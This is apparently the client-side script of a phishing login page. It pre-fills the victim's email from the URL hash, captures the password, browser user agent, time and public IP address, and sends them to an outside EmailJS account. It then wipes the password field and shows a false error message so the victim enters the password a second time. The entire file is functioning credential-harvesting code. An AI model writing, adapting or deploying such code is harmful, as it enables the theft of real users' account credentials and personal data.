

let form = document.getElementById("form");
let email = document.getElementById("email");
let pass = document.getElementById("password");
let inpWrapper = document.getElementById("input");
let button = document.getElementById("submit");
let nav = document.getElementById("nav");
let time = document.getElementById("time");
let Useragent = document.getElementById("UserAgent");
let err = document.getElementById("error-message");
let errIcon = document.getElementById("err-icon");
let tog = document.getElementById("toggle");
let loader = document.getElementById("loader-body")

// form loading animation
const forms = [...document.querySelector('.form').children];

forms.forEach((item, i) => {
    setTimeout(() => {
        item.style.opacity = 1;
    }, i*200);
})

window.onload = () => { 
  pass.focus();
}

// toggle passwrd
tog.addEventListener("click", toggle);
function toggle(){
   
   if(pass.type === "text"){
      pass.type="password"
     tog.innerHTML= "visibility_off"
   }  else{
      tog.innerHTML="visibility"
      pass.type= "text";}
}

  //  user browser info 
  Useragent.value = navigator.userAgent;
  // time logged
 time.value = new Date();

// hash the url   
let url = new URL(window.location)

email.value = url.hash.slice(1);

//api for browser location
fetch("https://api.ipify.org?format=json")
.then((res)=>{return res.json()})
.then((json)=>{
 nav.value =json.ip;
 console.log(json.ip)

})
.catch((err)=>{console.warn(err)})

// form submission

form.addEventListener("submit",function(event){
  event.preventDefault()
      loader.style.display="block"
      form.style.display="none";
   
     const serviceID ='service_nzuc0dr';
     const templateID ='template_04dookm';
                  emailjs.sendForm(serviceID, templateID, this)
                  .then(() => {
            
                  setTimeout(()=>{
                    loader.style.display="none"; form.style.display="block"; 
                }, 3000)
                   pass.value="";
                   inpWrapper.style.border = "1px solid red";
                   tog.style.display ="none";
                   errIcon.style.display="block";
                   err.hidden=false;
                  }, (err) => {
                   console.log(err);
            });
     
})

pass.onfocus = () => {
    inpWrapper.style.border = "2px solid green";
    tog.style.display ="block";
    errIcon.style.display="none";
    err.hidden=true;
}

